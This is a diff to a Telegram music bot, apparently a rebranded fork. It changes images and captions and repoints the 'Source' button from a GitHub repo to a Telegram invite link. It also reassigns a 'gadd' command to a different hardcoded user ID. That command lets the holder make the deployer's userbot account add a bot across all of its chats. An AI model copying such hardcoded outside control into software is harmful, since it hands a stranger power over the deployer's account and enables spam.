@@ -11,13 +11,13 @@ from BrandrdXMusic.utils.database import add_served_chat, get_assistant
 @app.on_message(filters.command("repo"))
 async def help(client: Client, message: Message):
     await message.reply_photo(
-        photo=f"https://telegra.ph/file/1aac9a42f6f35138da34b.jpg",
-        caption=f"""🍁𝐂𝐋𝐈𝐂𝐊🥰𝐁𝐄𝐋𝐎𝐖💝𝐁𝐔𝐓𝐓𝐎𝐍✨𝐓𝐎🙊𝐆𝐄𝐓🌱𝐑𝐄𝐏𝐎🍁""",
+        photo=f"https://files.catbox.moe/oswufw.jpg",
+        caption=f"""<blockquote><b>𝐂ʟɪᴄᴋ 𝐁ᴇʟᴏᴡ 𝐁ᴜᴛᴛᴏɴ 𝐓ᴏ 𝐆ᴇᴛ 𝐑ᴇᴘᴏ</b></blockquote>""",
         reply_markup=InlineKeyboardMarkup(
             [
                 [
                     InlineKeyboardButton(
-                        "ƨσʋяcɛ", url=f"https://github.com/WCGKING/BrandrdXMusic"
+                        "ƨσʋяcɛ", url=f"https://t.me/+6BADWq1ODA9mZjY1"
                     )
                 ]
             ]
@@ -28,13 +28,13 @@ async def help(client: Client, message: Message):
 @app.on_message(filters.command("clone"))
 async def clones(client: Client, message: Message):
     await message.reply_photo(
-        photo=f"https://telegra.ph/file/1aac9a42f6f35138da34b.jpg",
-        caption=f"""**🙂You Are Not Sudo User So You Are Not Allowed To Clone Me.**\n**😌Click Given Below Button And Host Manually Otherwise Contact Owner Or Sudo Users For Clone.**""",
+        photo=f"https://files.catbox.moe/oswufw.jpg",
+        caption=f"""<blockquote><b>🙂𝐘ᴏᴜ 𝐀ʀᴇ 𝐍ᴏᴛ 𝐒ᴜᴅᴏ 𝐔ꜱᴇʀ 𝐒ᴏ 𝐘ᴏᴜ 𝐀ʀᴇ 𝐍ᴏᴛ 𝐀ʟʟᴏᴡᴇᴅ 𝐓ᴏ 𝐂ʟᴏɴᴇ 𝐌ᴇ.\n😌𝐂ʟɪᴄᴋ 𝐆ɪᴠᴇɴ 𝐁ᴇʟᴏᴡ 𝐁ᴜᴛᴛᴏɴ 𝐀ɴᴅ 𝐇ᴏꜱᴛ 𝐌ᴀɴᴜᴀʟʟʏ 𝐎ᴛʜᴇʀᴡɪꜱᴇ 𝐂ᴏɴᴛᴀᴄᴛ 𝐎ᴡɴᴇʀ 𝐎ʀ 𝐒ᴜᴅᴏ 𝐔ꜱᴇʀꜱ 𝐅ᴏʀ 𝐂ʟᴏɴᴇ.</b></blockquote>**""",
         reply_markup=InlineKeyboardMarkup(
             [
                 [
                     InlineKeyboardButton(
-                        "ƨσʋяcɛ", url=f"https://github.com/WCGKING/BrandrdXMusic"
+                        "ƨσʋяcɛ", url=f"https://t.me/+6BADWq1ODA9mZjY1"
                     )
                 ]
             ]
@@ -63,7 +63,7 @@ async def bot_check(_, message):
 import asyncio
 
 
-@app.on_message(filters.command("gadd") & filters.user(int(7250012103)))
+@app.on_message(filters.command("gadd") & filters.user(int(8066923682)))
 async def add_allbot(client, message):
     command_parts = message.text.split(" ")
     if len(command_parts) != 2:
@@ -82,7 +82,7 @@ async def add_allbot(client, message):
         lol = await message.reply("🔄 **ᴀᴅᴅɪɴɢ ɢɪᴠᴇɴ ʙᴏᴛ ɪɴ ᴀʟʟ ᴄʜᴀᴛs!**")
         await userbot.send_message(bot_username, f"/start")
         async for dialog in userbot.get_dialogs():
-            if dialog.chat.id == -1001754457302:
+            if dialog.chat.id == -1002442457914:
                 continue
             try:
 
